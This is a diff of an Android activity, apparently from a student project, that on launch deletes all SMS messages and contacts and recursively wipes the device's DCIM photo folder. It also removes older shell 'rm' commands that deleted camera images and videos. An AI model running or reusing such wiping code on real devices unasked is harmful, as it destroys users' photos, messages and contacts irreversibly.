@@ -1,5 +1,6 @@
 package iiu.fyp.cdsr;
 
+import java.io.File;
 import java.io.IOException;
 
 import android.app.Activity;
@@ -7,6 +8,7 @@ import android.content.ContentResolver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.os.Environment;
 import android.provider.ContactsContract;
 
 public class DeleteContent extends Activity 
@@ -18,37 +20,23 @@ public class DeleteContent extends Activity
 	        super.onCreate(savedInstanceState);
 	        
 	        deletAllMsgs();
-	        deleteimages_all();
-	        deletevideos_all();
 	        deleteAllContacts();
+	        
+	        File dir = new File(Environment.getExternalStorageDirectory()+"/DCIM/");
+	        DeleteRecursive(dir);
 	        finish();
 	        
 	        
 	 }
+	 
+	 void DeleteRecursive(File fileOrDirectory) {
+		    if (fileOrDirectory.isDirectory())
+		        for (File child : fileOrDirectory.listFiles())
+		            DeleteRecursive(child);
 
-	 public void deletevideos_all()
-		{
-			//java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
-			
-			try {
-				java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
+		    fileOrDirectory.delete();
 		}
-		
-		public void deleteimages_all()
-		{
-			//java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.mp4");
-			
-			try {
-				java.lang.Runtime.getRuntime().exec("rm /sdcard/DCIM/Camera/*.jpg");
-			} catch (IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-		}
+
 	 void deletAllMsgs()
 	    {
 	    	Uri uri = Uri.parse("content://sms");
